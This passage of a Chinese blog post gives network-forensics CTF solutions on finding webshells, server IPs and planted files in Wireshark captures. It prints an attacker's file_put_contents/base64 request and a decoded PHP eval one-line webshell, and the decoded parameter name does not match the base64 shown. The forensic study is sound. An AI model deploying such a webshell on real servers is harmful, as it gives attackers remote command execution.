+<li><p><img src="C:\Users\liuyuanbiao\Desktop\BlogPhoto\wireshark004.png" alt="wireshark004"></p>
+</li>
+<li><p><img src="/img/image-20250625203435878.png" alt="image-20250625203435878"></p>
+</li>
+<li><p><img src="C:\Users\liuyuanbiao\Desktop\BlogPhoto\wireshark0041.png" alt="wireshark0041"></p>
+</li>
+<li><p><img src="C:\Users\liuyuanbiao\Desktop\BlogPhoto\wireshark0042.png" alt="wireshark0042"></p>
+</li>
+<li><p><img src="C:\Users\liuyuanbiao\Desktop\BlogPhoto\wireshark0045.png" alt="wireshark0045"></p>
+</li>
+<li><p><img src="C:\Users\liuyuanbiao\Desktop\BlogPhoto\wireshark0046.png" alt="wireshark0046"></p>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="Ann-wireshark-005"><a href="#Ann-wireshark-005" class="headerlink" title="Ann-wireshark-005"></a>Ann-wireshark-005</h2><p>题目：</p>
+<p>服务器自带的后门文件名是什么？（含文件后缀）</p>
+<p>服务器的内网IP是多少？</p>
+<p>攻击者往服务器中写入的key(key.txt)是什么？</p>
+<ol>
+<li><p>服务器自带的后门文件名是什么？（含文件后缀）</p>
+<ul>
+<li>通过时间，筛选最早的.php文件<code>http &amp;&amp; http.request.method ==&quot;POST&quot; &amp;&amp; http contains &quot;.php&quot;</code></li>
+<li><img src="/img/image-20250625210744343.png" alt="image-20250625210744343"></li>
+<li>追踪最早的那个数据包 打开发现<ul>
+<li>代码片段是攻击者利用 <code>file_put_contents</code> 和 <code>base64_decode</code> 将恶意代码写入 <code>d00r.php</code>，实现远程代码执行的典型攻击方式</li>
+<li>**<code>base64_decode(&#39;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg%3D%3D&#39;)</code>**将Base64编码的字符串解码为原始数据<ul>
+<li><?php @eval($_POST['x']); ?></li>
+</ul>
+</li>
+<li>所以这才是服务器自带的后门文件名<code>ViewMore.php</code></li>
+</ul>
+</li>
+<li><img src="/img/image-20250625210905505.png" alt="image-20250625210905505"></li>
+</ul>
+</li>
+</ol>
+<p>服务器的内网IP是多少？</p>
+<ol>
+<li><p>翻找流量包的时候发现在这里执行了一条ipconfig</p>
+<ul>
+<li><img src="/img/image-20250625213613707.png" alt="image-20250625213613707"></li>
+<li>查看响应包发现服务器上有两块网卡 根据流量包分析和的原地址和目的地址分析 162和黑客处于同一网段那么<code>192.168.101.132</code>就是服务器ip地址了<ul>
+<li><code>ens33</code>：总收发流量接近 <strong>400MB</strong>，但这不代表它在处理 <strong>你这次请求</strong></li>
+<li><code>ens38</code>：流量很小，仅几十 KB，<strong>但它正好对得上你执行一句话木马所造成的那一点点 POST + 响应流量</strong>！</li>
+</ul>
+</li>
+<li><img src="/img/image-20250625213739412.png" alt="image-20250625213739412" style="zoom:50%;" /></li>
+</ul>
+</li>
+<li><p>攻击者往服务器中写入的key(key.txt)是什么？</p>
+<ul>
+<li>上面攻击者利用 <code>file_put_contents</code> 和 <code>base64_decode</code> 将恶意代码写入 <code>d00r.php</code> 我们继续查看这条流量包还写入了什么恶意代码</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><img src="/img/image-20250625214600678.png" alt="image-20250625214600678"><ul>
+<li>继续往下翻 在下面查看到了<code>file_put_contents</code> 写入的恶意代码</li>
+<li><img src="/img/image-20250625214724198.png" alt="image-20250625214724198"></li>
+<li>对这段进行url -&gt; base64解码 发现ZIP文件的头部通常是<code>PK</code>（即<code>50 4B</code>在十六进制中）</li>
+<li>将解码后的数据复制到一个文本编辑器中</li>
+<li><img src="/img/image-20250626093422228.png" alt="image-20250626093422228"></li>
+</ul>
+</li>
+</ul>
+<h2 id="Ann-wireshark-006"><a href="#Ann-wireshark-006" class="headerlink" title="Ann-wireshark-006"></a>Ann-wireshark-006</h2><p>题目：</p>
+<ol>
+<li><p><code>admIn</code>用户的密码是什么？</p>
+</li>
+<li><p><code>app.config[&#39;SECRET_KEY&#39;]</code>值为多少？</p>
+</li>
+<li><p>flask网站由哪个用户启动</p>
+</li>
+<li><p>攻击者写入的内存马的路由名叫什么？</p>
+</li>
+<li><p><code>admIn</code>用户的密码是什么？</p>
+</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://0xMouise.github.io">0xMouise</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://0xmouise.github.io/2025/09/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">https://0xmouise.github.io/2025/09/15/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://0xMouise.github.io" target="_blank">0xMouise</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%8F%96%E8%AF%81/">网络取证</a><a class="post-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></div><div class="post-share"><div class="social-share" data-image="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/15/%E7%8E%84%E6%9C%BA%E2%80%94%E2%80%94%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/" title="玄机——第六章 流量特征分析-小王公司收到的钓鱼邮件"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmwmxmj31hc0u07wh.jpg" onerror="onerror=null;src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">玄机——第六章 流量特征分析-小王公司收到的钓鱼邮件</div></div><div class="info-2"><div class="info-item-1">玄机——第六章 流量特征分析-小王公司收到的钓鱼邮件1. 下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag{xxxx.co.xxxx&#x2F;w0ks&#x2F;&#x2F;?YO&#x3D;xxxxxxx}） (无需 http、https)；步骤分析：如何分析数据包文件？  过滤 HTTP&#x2F;HTTPS 流量  根据题目知道，黑客是获取了 zip 压缩包，在 Wireshark 中，恶意程序通常通过 HTTP 或 HTTPS 协议访问 URL 以下载文件（如 zip 压缩包） 我们可以使用使用过滤器：http 或 tls（如果 HTTPS）来筛选相关流量   查找文件下载请求  恶意程序下载 zip 压缩包时，通常会发送 HTTP GET 或 POST 请求。在 Wireshark 中： 查找包含 .zip 扩展名的请求（例如，过滤 http.re quest.uri contains &quot;.zip&quot;） 或查找响应中包含...</div></div></div></a><a class="pagination-related" href="/2025/09/15/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-ssh%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" title="日志分析-ssh日志分析"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmvo6mj31hc0u04qp.jpg" onerror="onerror=null;src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">日志分析-ssh日志分析</div></div><div class="info-2"><div class="info-item-1">日志分析-ssh日志分析题目：     1、可以登录 SSH 的账号数量是多少      2、SSH日志中登录成功的日志条数是多少（去除自己登陆产生的两次）      3、SSH日志中登录成功次数最多的用户的用户名是什么      4、SSH日志中登录失败次数最多的用户以及登录使用的ip是什么(flag:flag&#123;用户名,ip&#125;)  1、可以登录 SSH 的账号数量是多少这里直接查看ssh的服务配置文件/etc/ssh/sshd_config 是 SSH 服务端配置文件，用于控制 SSH 服务（sshd）的各种行为。 1cat /etc/ssh/sshd_config    AllowGroups SSHD_USER root：表示只有属于 SSHD_USER 组或 root 用户所在组的用户才可以登录 SSH。 其它用户 无论是否存在 shell，也无法登录 SSH，除非属于上面两个组之一 下一步我们查看所属组的用户 1cat /etc/group   可以看到只有两个用户属于SSHD_USER组一个是toor 另一个是root 所以flag{2} 常见配置...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/09/15/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="哥斯拉ekp版本流量分析"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmvo6mj31hc0u04qp.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-15</div><div class="info-item-2">哥斯拉ekp版本流量分析</div></div><div class="info-2"><div class="info-item-1">哥斯拉ekp版本流量分析1.黑客上传的木马文件名是什么？根据这个靶场提示这里是用哥斯拉连接的 我们先复习一下哥斯拉链接webshell的流量特征是什么 12345678910111213141. 流量中可见`eval`、`base64_decode`、`strrev`等函数2. 强特征:链接失败情况下2个流量包，成功为 3个流量包3. 第一个请求总会发送大量数据，这是配置信息，且请求包内无 cookie，服务器响应包无内容，生成一个 session，后续请求会带上此session 到请求包中的 cookie中3、强特征:生成的 cookie 后面有个分号4. Accept:   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*   /*;q=0.85. Accept-Language :   zh-CN,zh;q=0.8,zh-Tw;q=0.7,zh-HK;q=0.5,en-Us;q=0.3,en;q=0.26. 尝试利用默认密钥等解密 成功还原算法明文即可认定对应工具  我们打开靶场下载的流量包...</div></div></div></a><a class="pagination-related" href="/2025/09/15/%E5%86%B0%E8%9D%8E3.0-jsp%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="冰蝎3.0-jsp流量分析"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-15</div><div class="info-item-2">冰蝎3.0-jsp流量分析</div></div><div class="info-2"><div class="info-item-1">冰蝎3.0-jsp流量分析题目： 1.黑客IP是什么？ 2.黑客上传的Webshell名是什么？ 3.黑客上传WebShell的时间是多少？（格式如：flag{YYYY-MM-DD HH:MM:SS}） 4.木马的解密key是什么? 5.黑客执行的第一个命令是什么? 6.黑客上传的文件内容是什么? 7.黑客下载的文件内容是什么?  8.服务器内的flag是什么？ 1.黑客IP是什么？根据靶场题目说找冰蝎的流量，我们可以看一下冰蝎流量包的特征 1234561. POST传参2. User-Agent: Mozilla/5.0(windows NT 6.1;Trident/7.0; rv:11.0)like Gecko3. Accept :text/html,application/xhtml+xml,application/xml;q=0.9,image/webp, image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.94. Accept-Language:h-CN,zh;q=0.9,en-US;q=0.8,en;q=...</div></div></div></a><a class="pagination-related" href="/2025/09/15/%E7%8E%84%E6%9C%BA%E2%80%94%E2%80%94%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B0%8F%E7%8E%8B%E5%85%AC%E5%8F%B8%E6%94%B6%E5%88%B0%E7%9A%84%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/" title="玄机——第六章 流量特征分析-小王公司收到的钓鱼邮件"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmwmxmj31hc0u07wh.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-15</div><div class="info-item-2">玄机——第六章 流量特征分析-小王公司收到的钓鱼邮件</div></div><div class="info-2"><div class="info-item-1">玄机——第六章 流量特征分析-小王公司收到的钓鱼邮件1. 下载数据包文件 hacker1.pacapng，分析恶意程序访问了内嵌 URL 获取了 zip 压缩包，该 URL 是什么将该 URL作为 FLAG 提交 FLAG（形式：flag{xxxx.co.xxxx&#x2F;w0ks&#x2F;&#x2F;?YO&#x3D;xxxxxxx}） (无需 http、https)；步骤分析：如何分析数据包文件？  过滤 HTTP&#x2F;HTTPS 流量  根据题目知道，黑客是获取了 zip 压缩包，在 Wireshark 中，恶意程序通常通过 HTTP 或 HTTPS 协议访问 URL 以下载文件（如 zip 压缩包） 我们可以使用使用过滤器：http 或 tls（如果 HTTPS）来筛选相关流量   查找文件下载请求  恶意程序下载 zip 压缩包时，通常会发送 HTTP GET 或 POST 请求。在 Wireshark 中： 查找包含 .zip 扩展名的请求（例如，过滤 http.re quest.uri contains &quot;.zip&quot;） 或查找响应中包含...</div></div></div></a><a class="pagination-related" href="/2025/09/15/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="第六章-哥斯拉4.0流量分析"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-15</div><div class="info-item-2">第六章-哥斯拉4.0流量分析</div></div><div class="info-2"><div class="info-item-1">第六章-哥斯拉4.0流量分析1、黑客的IP是什么？我们打开wireshark，哥斯拉的流量都是用POST的传输的，所以什么直接抓取post流量包 1http.request.method==&quot;POST&quot;   发现post的流量包都集中在hello.jsp这个文件,我们再搜索一下这个文件 1http contains &quot;/hello.jsp&quot;   这里有个hello.jsp的文件打开看看  典型的哥斯拉流量包的特征至此我们确认黑客ip 1flag&#123;192.168.31.190&#125;  2.黑客是通过什么漏洞进入服务器的？（提交CVE编号）我们继续分析流量包  在这个流量包的末尾这里发现了中间件为Apache Tomcat&#x2F;8.5.19，这里又是用的put方式讲文件上传，所以我猜黑客是使用了Tomcat&#x2F;8.5.19文件上传漏洞 1flag&#123;CVE-2017-12615&#125;    3.黑客上传的木马文件名是什么？(提交文件名)根据前面第一题可以知道文件名为hello.jsp 1flag&#1...</div></div></div></a><a class="pagination-related" href="/2025/09/15/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="第六章 流量特征分析-蚁剑流量分析"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-15</div><div class="info-item-2">第六章 流量特征分析-蚁剑流量分析</div></div><div class="info-2"><div class="info-item-1">第六章 流量特征分析-蚁剑流量分析1234561.木马的连接密码是多少2.黑客执行的第一个命令是什么3.黑客读取了哪个文件的内容，提交文件绝对路径4.黑客上传了什么文件到服务器，提交文件名5.黑客上传的文件内容是什么6.黑客下载了哪个文件，提交文件绝对路径  1.木马的连接密码是多少webshell链接工具是用post传输的我们直接在wireshark里面输入命令 1http.request.method ==&quot;POST&quot;  来定位用post传输的流量  在未启用编码器或使用默认配置时，木马密码直接作为POST请求的第一个参数名出现。 打开第一个就能看到链接密码 1flag&#123;1&#125;   2.黑客执行的第一个命令是什么上一题我们知道1.php为黑客上传的shell了这里我们对这个文件进行搜索 1http contains &quot;1.php&quot;   打开长度为894的流量包 右键 追踪http流 作 在蚁剑流量中，黑客执行的命令隐藏在 POST请求的特定参数值 中，需关注以下特征：  参数命名规则： 参数名格式为 ma[16位随机字...</div></div></div></a><a class="pagination-related" href="/2025/09/15/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6-Tomcat/" title="第六章-流量特征分析-常见攻击事件-Tomcat"><img class="cover" src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fd15ffjaj31hc0xcqth.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-15</div><div class="info-item-2">第六章-流量特征分析-常见攻击事件-Tomcat</div></div><div class="info-2"><div class="info-item-1">第六章 流量特征分析-常见攻击事件 Tomcat1.  在web服务器上发现的可疑活动,流量分析会显示很多请求,这表明存在恶意的扫描行为,通过分析扫描的行为后提交攻击者IP flag格式：flag{ip}，如：flag{127.0.0.1}分析黑客的扫描行为这里我们要识别恶意扫描特征  恶意扫描通常表现为大量SYN请求（TCP半连接扫描），这是Nmap等工具常用的扫描方式。攻击者会向目标服务器多个端口发送SYN包，探测开放端口  我们使用命令tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0过滤流量包  tcp.flags.syn == 1：筛选TCP协议中 SYN标志位（Synchronize）被置位（值为1） 的数据包。SYN标志用于建立TCP连接的初始握手（第一次握手）。 tcp.flags.ack == 0：筛选 ACK标志位（Acknowledgment）未被置位（值为0） 的数据包。ACK标志用于确认数据接收（第二次握手后出现）。 组合逻辑：该命令捕获 仅包含SYN请求而无ACK响应的TCP包，即TCP连接的第一次握手包。...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5fcbmxlm4j30u00u9wk1.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="avatar"/></div><div class="author-info-name">0xMouise</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">94</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#h%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">h流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ann-wireshark-001"><span class="toc-number">1.1.</span> <span class="toc-text">Ann-wireshark-001</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ann-wireshark-005"><span class="toc-number">1.2.</span> <span class="toc-text">Ann-wireshark-005</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ann-wireshark-006"><span class="toc-number">1.3.</span> <span class="toc-text">Ann-wireshark-006</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/09/15/015-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&amp;WAF&amp;%E8%9C%9C%E7%BD%90%E8%AF%86%E5%88%AB%E9%A1%B9%E7%9B%AE%E7%AD%89/" title="015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等"><img src="https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/009b6JyXly1i5fd15gq7dj31hc0xce81.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等"/></a><div class="content"><a class="title" href="/2025/09/15/015-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F&amp;WAF&amp;%E8%9C%9C%E7%BD%90%E8%AF%86%E5%88%AB%E9%A1%B9%E7%9B%AE%E7%AD%89/" title="015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等">015-信息打点-端口扫描&amp;WAF&amp;蜜罐识别项目等</a><time datetime="2025-09-15T15:30:00.000Z" title="发表于 2025-09-15 23:30:00">2025-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/15/014-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-JS%E6%9E%B6%E6%9E%84&amp;%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB&amp;%E6%B3%84%E6%BC%8F%E6%8F%90%E5%8F%96&amp;API%E6%8E%A5%E5%8F%A3%E6%9E%9A%E4%B8%BE&amp;FUZZ%E7%88%AC%E8%99%AB&amp;%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/" title="014-信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目"><img src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fd15ffjaj31hc0xcqth.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="014-信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目"/></a><div class="content"><a class="title" href="/2025/09/15/014-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-JS%E6%9E%B6%E6%9E%84&amp;%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB&amp;%E6%B3%84%E6%BC%8F%E6%8F%90%E5%8F%96&amp;API%E6%8E%A5%E5%8F%A3%E6%9E%9A%E4%B8%BE&amp;FUZZ%E7%88%AC%E8%99%AB&amp;%E6%8F%92%E4%BB%B6%E9%A1%B9%E7%9B%AE/" title="014-信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目">014-信息打点-JS架构&amp;框架识别&amp;泄漏提取&amp;API接口枚举&amp;FUZZ爬虫&amp;插件项目</a><time datetime="2025-09-15T15:30:00.000Z" title="发表于 2025-09-15 23:30:00">2025-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/15/016-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-CDN%E7%BB%95%E8%BF%87&amp;%E8%B5%84%E6%BA%90URL&amp;%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE%E7%AD%89/" title="016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxg1fj31hc0xc4qp.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等"/></a><div class="content"><a class="title" href="/2025/09/15/016-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-CDN%E7%BB%95%E8%BF%87&amp;%E8%B5%84%E6%BA%90URL&amp;%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE%E7%AD%89/" title="016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等">016-信息打点-CDN绕过&amp;资源URL&amp;工具项目等</a><time datetime="2025-09-15T15:30:00.000Z" title="发表于 2025-09-15 23:30:00">2025-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/15/019-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%BB%84%E6%89%8B&amp;%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7&amp;%E4%BE%9D%E8%B5%96%E7%AD%89/" title="019-信息打点-小程序组手&amp;开发工具&amp;依赖等"><img src="https://image.baidu.com/search/down?url=https://wx4.sinaimg.cn/large/009b6JyXly1i5ff9rxengj31hc0xc1kx.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="019-信息打点-小程序组手&amp;开发工具&amp;依赖等"/></a><div class="content"><a class="title" href="/2025/09/15/019-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%BB%84%E6%89%8B&amp;%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7&amp;%E4%BE%9D%E8%B5%96%E7%AD%89/" title="019-信息打点-小程序组手&amp;开发工具&amp;依赖等">019-信息打点-小程序组手&amp;开发工具&amp;依赖等</a><time datetime="2025-09-15T15:30:00.000Z" title="发表于 2025-09-15 23:30:00">2025-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/15/018-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-APP%E8%B5%84%E4%BA%A7&amp;%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83&amp;%E5%BA%94%E7%94%A8%E7%9B%91%E6%8E%A7&amp;%E9%9D%99%E6%80%81%E6%8F%90%E5%8F%96&amp;%E5%8A%A8%E6%80%81%E6%8A%93%E5%8C%85&amp;%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" title="018-信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试"><img src="https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5ff9rzye0j31hc0xc7wh.jpg" onerror="this.onerror=null;this.src='https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/009b6JyXly1i5fcbmqwfdj318g0p0q38.jpg'" alt="018-信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试"/></a><div class="content"><a class="title" href="/2025/09/15/018-%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-APP%E8%B5%84%E4%BA%A7&amp;%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83&amp;%E5%BA%94%E7%94%A8%E7%9B%91%E6%8E%A7&amp;%E9%9D%99%E6%80%81%E6%8F%90%E5%8F%96&amp;%E5%8A%A8%E6%80%81%E6%8A%93%E5%8C%85&amp;%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/" title="018-信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试">018-信息打点-APP资产&amp;知识产权&amp;应用监控&amp;静态提取&amp;动态抓包&amp;动态调试</a><time datetime="2025-09-15T15:30:00.000Z" title="发表于 2025-09-15 23:30:00">2025-09-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/009b6JyXly1i5ff9rz4hqj31hc0xcqv5.jpg);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By 0xMouise</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div><div class="footer_custom_text">如果身体是瑕疵的半成品 那就让灵魂成为永远燃烧的永动机</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas 